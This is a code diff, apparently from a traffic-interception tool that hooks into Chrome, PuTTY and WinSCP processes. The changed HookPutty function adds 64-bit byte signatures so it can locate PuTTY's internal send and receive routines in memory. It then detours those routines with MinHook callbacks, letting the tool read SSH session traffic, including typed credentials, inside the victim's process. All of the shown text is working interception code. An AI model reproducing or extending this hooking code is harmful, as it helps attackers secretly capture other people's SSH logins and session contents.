@@ -85,14 +85,24 @@ void HookChrome()
 void HookPutty()
 {
 	SECTION_INFO text  = {0, 0};
-	unsigned char SEND_string[] = { 0x55, 0x53, 0x57, 0x56, 0x83, 0xEC, 0x0C, 0x8B, 0x74, 0x24, 
+
+	// 32 bits signatures 
+
+	unsigned char SEND_string32[] = { 0x55, 0x53, 0x57, 0x56, 0x83, 0xEC, 0x0C, 0x8B, 0x74, 0x24, 
 		0x20, 0x8B, 0x7C, 0x24, 0x28, 0x83, 0x3E, 0x00, 0x75, 0x17 };
-	unsigned char RECV_string[] = { 0x56, 0x8B, 0x74, 0x24, 0x08, 0x8D, 0x46, 0x60, 0xFF, 0x74, 
+	unsigned char RECV_string32[] = { 0x56, 0x8B, 0x74, 0x24, 0x08, 0x8D, 0x46, 0x60, 0xFF, 0x74, 
 		0x24, 0x14, 0xFF, 0x74, 0x24, 0x14, 0x50, 0xE8 };
+
+	// 64 bits signatures
+
+	unsigned char SEND_string64[] = { 0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x56, 0x57, 
+		0x55, 0x53, 0x48, 0x83, 0xEC, 0x28, 0x45, 0x89, 0xCE, 0x45, 0x89, 0xC7, 0x49, 0x89, 0xD5 };
+	unsigned char RECV_string64[] = { 0x56, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x89, 0xCE, 0x48, 0x83, 
+		0xE9, 0x80, 0x4C, 0x89, 0xC2, 0x45, 0x89, 0xC8, 0xE8 };
 
 	//Get .text section
 
-	text  = Process::GetModuleSection("putty.exe", ".text");
+	text  = Process::GetModuleSection("", ".text");
 
 	if(text.dwSize == 0 || text.dwStartAddress == 0)
 	{
@@ -102,22 +112,42 @@ void HookPutty()
 
 	// Serach functions
 
-	ADDRESS_VALUE pSend = Process::SearchMemory((void *)text.dwStartAddress, text.dwSize, (void *)SEND_string, sizeof(SEND_string));
-	ADDRESS_VALUE pRecv = Process::SearchMemory((void *)text.dwStartAddress, text.dwSize, (void *)RECV_string, sizeof(RECV_string));
+	ADDRESS_VALUE pSend32 = Process::SearchMemory((void *)text.dwStartAddress, text.dwSize, (void *)SEND_string32, sizeof(SEND_string32));
+	ADDRESS_VALUE pRecv32 = Process::SearchMemory((void *)text.dwStartAddress, text.dwSize, (void *)RECV_string32, sizeof(RECV_string32));
 
-	if(pSend == 0 || pRecv == 0)
+	ADDRESS_VALUE pSend64 = Process::SearchMemory((void *)text.dwStartAddress, text.dwSize, (void *)SEND_string64, sizeof(SEND_string64));
+	ADDRESS_VALUE pRecv64 = Process::SearchMemory((void *)text.dwStartAddress, text.dwSize, (void *)RECV_string64, sizeof(RECV_string64));
+
+	// We have 32 bits version
+
+	if(pSend32 && pRecv32)
 	{
-		DebugLog::Log("[ERROR] Cannot get Putty functions!");
+		// Add hooks
+
+		PuttySend_Original = (PuttySend_Typedef)pSend32;
+		PuttyRecv_Original = (PuttyRecv_Typedef)pRecv32;
+
+		MH_CreateHook((void *)pSend32, (void *)PuttySend_Callback, &((void *)PuttySend_Original));
+		MH_CreateHook((void *)pRecv32, (void *)PuttyRecv_Callback, &((void *)PuttyRecv_Original));
 		return;
 	}
 
-	// Add hooks
+	// We have 64 bits version
 
-	PuttySend_Original = (PuttySend_Typedef)pSend;
-	PuttyRecv_Original = (PuttyRecv_Typedef)pRecv;
+	if (pSend64 && pRecv64)
+	{
+		// Add hooks
 
-	MH_CreateHook((void *)pSend, (void *)PuttySend_Callback, &((void *)PuttySend_Original));
-	MH_CreateHook((void *)pRecv, (void *)PuttyRecv_Callback, &((void *)PuttyRecv_Original));
+		PuttySend_Original = (PuttySend_Typedef)pSend64;
+		PuttyRecv_Original = (PuttyRecv_Typedef)pRecv64;
+
+		MH_CreateHook((void *)pSend64, (void *)PuttySend_Callback, &((void *)PuttySend_Original));
+		MH_CreateHook((void *)pRecv64, (void *)PuttyRecv_Callback, &((void *)PuttyRecv_Original));
+
+		return;
+	}
+
+	DebugLog::Log("[ERROR] Cannot get Putty functions!");
 }
 
 // Hook WinSCP
